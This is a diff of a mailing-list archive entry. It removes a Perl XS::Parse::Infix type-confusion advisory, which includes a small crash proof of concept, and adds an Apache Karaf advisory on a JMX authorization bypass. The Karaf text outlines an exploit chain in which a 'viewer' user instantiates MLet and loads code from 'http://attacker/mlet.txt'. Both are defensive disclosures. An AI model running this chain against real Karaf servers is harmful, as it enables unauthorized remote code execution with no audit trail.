@@ -1,74 +1,65 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2026/09/28/14
-Message-ID: <a1f0c38b-5c22-4d1c-ada2-e1e63cc60124@cpansec.org>
-Date: Mon, 28 Sep 2026 17:10:19 +0100
-From: Robert Rothenberg <rrwo@...nsec.org>
-To: cve-announce@...urity.metacpan.org, oss-security@...ts.openwall.com
-Subject: CVE-2026-85644: XS::Parse::Infix versions from 0.40 through 0.49 for Perl treat a number as an array reference
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2026/09/28/11
+Message-ID: <a3d1633f-a90c-71af-4d24-8f1f3bca8824@apache.org>
+Date: Mon, 28 Sep 2026 16:17:45 +0000
+From: Jean-Baptiste Onofré <jbonofre@...che.org>
+To: oss-security@...ts.openwall.com
+Subject: CVE-2026-92142: Apache Karaf: Authorization bypass in JMX MBean lifecycle operations
 Content-Type: text/plain; charset=utf-8
 
-========================================================================
-CVE-2026-85644                                       CPAN Security Group
-========================================================================
+Severity: important 
 
-         CVE ID:  CVE-2026-85644
+Affected versions:
 
-   Distribution:  XS-Parse-Keyword
-       Versions:  from 0.40 through 0.49
-       MetaCPAN:  https://metacpan.org/dist/XS-Parse-Keyword
+- Apache Karaf before 4.4.12
+
+Description:
+
+Apache Karaf exposes a JMX MBeanServer guarded by KarafMBeanServerGuard, which enforces role-based access control (RBAC) on MBean operations invoked over the remote JMX connector (RMI registry/server, enabled by default on ports 1099 and 44444). The guard is implemented as a java.lang.reflect.Proxy around the MBeanServer, and only forwards a fixed list of operation names to the RBAC check, defined in MBeanInvocationHandler#guarded:
 
 
-XS::Parse::Infix versions from 0.40 through 0.49 for Perl treat a
-number as an array reference
+  private final List<String> guarded = Collections.unmodifiableList( Arrays.asList("invoke", "getAttribute", "getAttributes", "setAttribute", "setAttributes"));
 
-Description
------------
-XS::Parse::Infix versions from 0.40 through 0.49 for Perl treat a
-number as an array reference.
 
-The wrapper function XS::Parse::Infix generates for a list-associative
-infix operator checks whether arguments are array references, but it
-tests using SvRV() rather than SvROK(). SvRV() reads a union slot that
-only holds a referent once SvROK(sv) is true, so the guard never
-validates that it is a reference. For an IV or NV that slot holds the
-number itself, SvRV() returns the caller's value and SvTYPE()
-dereferences it at offset 12. This will generally result in a
-segmentation fault.
 
-An application that hands the wrapper a list built from decoded input
-(for example, from JSON) lets whoever supplies a number in that list
-choose the address that the interpreter dereferences.
 
-An ordinary string's byte 12 is rarely SVt_PVAV so the guard croaks by
-luck, but an attacker-crafted string carrying 0x0b there passes, and
-the buffer is then used as an AV head, with AvARRAY taken from bytes
-16-23 and its entries pushed onto the Perl stack as live SVs.
+The MBean lifecycle operations MBeanServer#createMBean, #registerMBean and #unregisterMBean are not in this list. Calls to these methods are forwarded directly to the underlying MBeanServer with no role check at all, regardless of the roles configured in etc/jmx.acl.*.cfg.
 
-A simple proof-of-concept uses the zip operator:
 
-     use Syntax::Operator::Zip 'zip';
 
-     my @args = ([1], 2);
-     zip(@args);
 
-Problem types
--------------
-- CWE-843 Access of Resource Using Incompatible Type ('Type Confusion')
-- CWE-125 Out-of-bounds Read
+As a result, any user who can authenticate to the JMX endpoint, including a user holding only the least-privileged "viewer" role, can call createMBean() to instantiate an arbitrary class as a MBean, and unregisterMBean() to remove it again afterwards, with no authorization check and no audit log entry (logging in KarafMBeanServerGuard only occurs on the RBAC-denial path, which this bypass never reaches).
 
-Workarounds
------------
-For deployments that cannot upgrade, ensure that correct arguments
-(only array references where they are expected) are passed to
-list-associative operators that are defined with XS::Parse::Infix, such
-as those in Syntax::Operator::Zip.
 
-Solutions
----------
-Upgrade to XS-Parse-Keyword 0.50 or later.
 
-References
-----------
-https://metacpan.org/release/PEVANS/XS-Parse-Keyword-0.50/changes
-https://metacpan.org/release/PEVANS/XS-Parse-Keyword-0.50/diff/PEVANS/XS-Parse-Keyword-0.49#src/infix.c
+
+This is significant because javax.management.loading.MLet, a standard JDK MBean, can be instantiated this way. MLet acts as a remote classloader: its getMBeansFromURL(URL) operation fetches an MLet text file from an attacker-controlled URL and instantiates and registers the classes it lists as new MBeans in the target JVM. Reaching this operation still goes through KarafMBeanServerGuard's existing "invoke" check, but the default etc/jmx.acl.cfg grants the "viewer" role to any method name matching the wildcard rule "get* = viewer", a heuristic intended for read-only getters. Because "getMBeansFromURL" happens to start with "get", it also matches that rule, so a default installation grants "viewer" callers permission to invoke it without any Karaf-specific ACL naming MLet at all. Combined with the createMBean gap, this gives a "viewer"-role JMX client a path to remote code execution to the Karaf JVM:
+
+  *  Authenticate to JMX as any user with any role (e.g. "viewer").
+  *  mbs.createMBean("javax.management.loading.MLet", objectName) is not in GUARDED_OPERATIONS, no RBAC check, MLet is instantiated and registered.
+  *  mbs.invoke(objectName, "getMBeansFromURL", new Object[]{"http://attacker/mlet.txt"}, ...) is guarded, but the method name matches the default "get* = viewer" ACL rule, so permitted.
+  *  The remote .mlet file is fetched and its listed classes are loaded and registered as new MBeans, running attacker-supplied code in the Karaf JVM.
+  *  mbs.unregisterMBean(objectName) can be used to remove the MLet afterwards, also not in GUARDED_OPERATIONS, no RBAC check, no audit trail.
+
+
+The fix adds createMBean, registerMBean and unregisterMBean to the guarded operation list, resolves required roles for them from the jmx.acl* configuration by ObjectName and (for createMBean/registerMBean) MBean class name, and ships default etc/jmx.acl.cfg entries restricting all three operations to the "admin" role. This allows deployments to also write class-name-specific rule, e.g.:
+
+
+
+
+createMBean(java.lang.String)[/javax\.management\.loading\..*/] = admin
+
+
+
+
+Apache Karaf users should upgrade to 4.4.12 or 4.5.0 or later, once released, as soon as possible. Until an upgrade is available, restrict network access to the JMX RMI registry/server ports (1099/44444) to trusted hosts, or avoid issuing any non-"admin" JMX credentiels.
+
+Credit:
+
+MopMonk-AI <mopmonk-ai@...hant.com> (reporter)
+
+References:
+
+https://karaf.apache.org/
+https://www.cve.org/CVERecord?id=CVE-2026-92142
 
